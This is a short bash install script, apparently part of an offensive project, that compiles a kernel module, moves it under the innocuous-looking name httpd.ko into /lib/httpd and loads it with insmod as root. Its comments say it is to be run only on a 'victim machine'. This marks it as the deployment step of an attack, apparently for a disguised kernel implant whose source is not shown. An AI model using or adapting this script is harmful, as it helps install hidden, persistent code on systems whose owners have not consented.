#!/bin/bash

# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

CC=gcc-9 # Change this to kernel gcc version (find using cat /proc/version)
make CC=$CC

mkdir -p /lib/httpd
mv ./httpd.ko /lib/httpd/

insmod /lib/httpd/httpd.ko

make clean

# TODO = cleanup
